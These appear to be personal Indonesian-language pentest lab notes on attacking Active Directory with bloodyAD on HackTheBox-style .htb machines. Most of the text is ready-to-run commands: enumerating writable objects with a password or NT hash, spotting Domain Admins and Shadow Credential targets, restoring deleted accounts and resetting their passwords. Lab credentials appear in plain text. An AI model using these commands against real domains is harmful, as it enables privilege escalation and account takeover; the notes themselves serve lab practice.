# Apa object yang dapat kita modifikasi/tulis
```shell
# Dengan password
bloodyad --host 10.129.244.207 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable

# Dengan NT hash
bloodyad --host 10.129.245.130 -d logging.htb -u 'msa_health$' -p:603fc24ee01a9409f83c9d1d701485c5 get writable
```
![](Attachments/Pasted%20image%2020260623102457.png)
cek yang ACL nya "WRITE"

| Yang perlu dicek                                                                            | Reason                    |
| ------------------------------------------------------------------------------------------- | ------------------------- |
| `CN=Domain Admins,CN=Users,DC=logging,DC=htb \| member`                                     | Punya akses k group admin |
| `CN=DC01,OU=Domain Controllers,... \| msDS-KeyCredentialLink`                               | Shadow Credential attack  |
| `distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb<br><br>`permission: WRITE | suffix ADM                |

# Cek member dari group apa
```
Bloodyad --host 10.129.244.207 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get object "CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb" --attr memberOf
```
![](Attachments/Pasted%20image%2020260716165733.png)
# Delete Account
jika ada ini berarti akun kita pernah menghapus akun
```plain
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE
```

coba restored
```shell
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```
![](Attachments/Pasted%20image%2020260623103908.png)

Biasanya password akun yang di restored sama dengan akun yang melakukan restored
tapi kalau tidak set password baru
```shell
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set password 'Mark Davies' 'NewPass@123!'
```

jika error kemunggkinan account SAM nya beda
![](Attachments/Pasted%20image%2020260623105213.png)

cek nama SAM account nya
```shell
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object "CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb" --attr sAMAccountName
```

restore dengan nama SAM account
```shell
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set password "mark.davies" 'NewPass@123!'
```